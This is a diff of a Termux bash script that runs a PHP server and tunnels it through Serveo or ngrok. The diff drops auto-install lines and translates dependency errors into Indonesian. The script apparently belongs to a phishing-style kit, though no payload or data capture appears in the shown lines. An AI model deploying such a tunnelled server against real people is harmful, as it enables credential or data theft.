@@ -1,11 +1,5 @@
 #!/bin/bash
 clear
-termux-setup-storage
-pkg install php -y
-pkg install openssh -y
-pkg install python -y
-pkg install wget -y
-clear
 trap 'printf "\n";stop' 2
 
 banner() {
@@ -51,7 +45,7 @@ exit 1
 dependencies() {
 
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "Kamu belum install php ( pkg install php )"; exit 1; }
  
 
 
@@ -97,7 +91,7 @@ done
 
 server() {
 
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "kamu belum install ssh ( pkg install openssh )"; exit 1; }
 
 printf "\e[1;77m\e[0m\e[1;93m☆(☢‿☢)☆\e[0m\e[1;77m Start Serveo...\e[0m\n"
 
@@ -140,8 +134,8 @@ ngrok_server() {
 if [[ -e ngrok ]]; then
 echo ""
 else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "kamu belum install unzip"; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "kamu belum install wget ( pkg install wget )"; exit 1; }
 printf "\e[1;92m\e[0mᕕ( ͡° ͜ʖ ͡°)▄︻̷̿┻̿═━一\e[1;92m Download Ngorok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
@@ -191,13 +185,13 @@ fi
 
 printf "\n"
 printf "\e[1;92m⫸\e[0m\e[1;77m01\e[0m\e[1;92m\e[0m\e[1;93m Serveo.net\e[0m\n"
-printf "\e[1;92m⫸\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngorok\e[0m\n"
+printf "\e[1;92m⫸\e[0m\e[1;77m02\e[0m\e[1;92m\e[0m\e[1;93m Ngorok\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Pilih 1 atau 2 : \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 1 ]]; then
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "kamu belum install ssh ( pkg install openssh )"; exit 1; }
 start
 
 elif [[ $option_server -eq 2 ]]; then
